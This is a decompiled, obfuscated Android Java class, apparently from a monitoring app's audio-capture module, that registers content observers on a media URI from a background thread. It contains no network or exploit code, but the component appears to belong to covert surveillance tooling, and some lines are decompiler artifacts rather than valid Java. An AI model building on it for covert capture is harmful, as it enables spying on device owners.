package com.vvt.capture.audio.b;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import com.vvt.ak.a;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import java.util.HashSet;
import java.util.Iterator;

public class b
  implements e
{
  private static final boolean a = a.b;
  private HashSet b;
  private ContentResolver c;
  private Looper d;
  private Thread e;
  
  public b(ContentResolver paramContentResolver)
  {
    this.c = paramContentResolver;
  }
  
  private void a(Uri paramUri, i parami)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = new android/os/Handler;
    ((Handler)localObject).<init>();
    d locald = new com/vvt/capture/audio/b/d;
    locald.<init>(this, (Handler)localObject, parami);
    this.b.add(locald);
    localObject = this.c;
    boolean bool2 = true;
    ((ContentResolver)localObject).registerContentObserver(paramUri, bool2, locald);
    bool1 = a;
    if (bool1) {}
  }
  
  public void a(i parami)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = new java/util/HashSet;
    ((HashSet)localObject).<init>();
    this.b = ((HashSet)localObject);
    localObject = this.e;
    if (localObject == null)
    {
      localObject = new java/lang/Thread;
      c localc = new com/vvt/capture/audio/b/c;
      localc.<init>(this, parami);
      String str = "AudioOT";
      ((Thread)localObject).<init>(localc, str);
      this.e = ((Thread)localObject);
      localObject = this.e;
      ((Thread)localObject).start();
    }
    bool = a;
    if (bool) {}
  }
  
  public void b()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.c;
    if (localObject != null)
    {
      localObject = this.b;
      if (localObject != null)
      {
        localObject = this.b;
        Iterator localIterator = ((HashSet)localObject).iterator();
        for (;;)
        {
          bool = localIterator.hasNext();
          if (!bool) {
            break;
          }
          localObject = (ContentObserver)localIterator.next();
          ContentResolver localContentResolver = this.c;
          localContentResolver.unregisterContentObserver((ContentObserver)localObject);
        }
      }
    }
    localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      ((Looper)localObject).quit();
    }
    localObject = null;
    this.e = null;
    bool = a;
    if (bool) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/audio/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */